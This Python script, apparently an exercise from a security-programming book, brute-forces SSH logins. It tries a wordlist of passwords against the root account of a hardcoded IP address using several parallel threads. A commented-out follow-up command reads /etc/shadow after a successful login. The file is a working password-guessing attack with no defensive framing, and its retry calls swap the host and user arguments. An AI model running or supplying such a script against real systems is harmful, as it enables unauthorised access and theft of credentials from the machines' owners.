import pxssh
import optparse
import time
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(user,host,password,release):
  global Found
  global Fails
  try:
    s = pxssh.pxssh()
    s.login(host,user,password)
    print('[+]Password Found:' + password)
    Found = True
  except Exception as e:
    if 'read_nonblocking' in str(e):
      print("[-] Read_nonblocking error")
      Fails += 1
      time.sleep(5)
      connect(host,user,password,False)
    elif 'synchronize with original prompt' in str(e):
      print("[-] Synchronize with orginal prompt error")
      time.sleep(1)
      connect(host,user,password,False)
    else:
      print("[!] other error :" + str(e))
  finally:
    if release:
      connection_lock.release()
def main():
  host = '222.187.222.21'
  user = 'root'
  #password = 'root'

  passwordfile = open("/opt/security_python/chapter02/password/1pass00.txt","r")

  for line in passwordfile.readlines():
    if Found:
      print("[*] Exiting: Password Found !")
      exit(0)
    if Fails > 50:
      print("[!] Exiting: Too Many Socket Timeout")
      exit(0)
    connection_lock .acquire()
    password = line.strip('\r').strip('\n')
    print("[-] Testing: " + password)
    t = threading.Thread(target=connect, args=(user, host, password, True))
    child = t.start()
  #child = connect(user,host,password,True)
  # send_command(child,'cat /etc/shadow | grep sys')
if __name__ == '__main__':
  main()
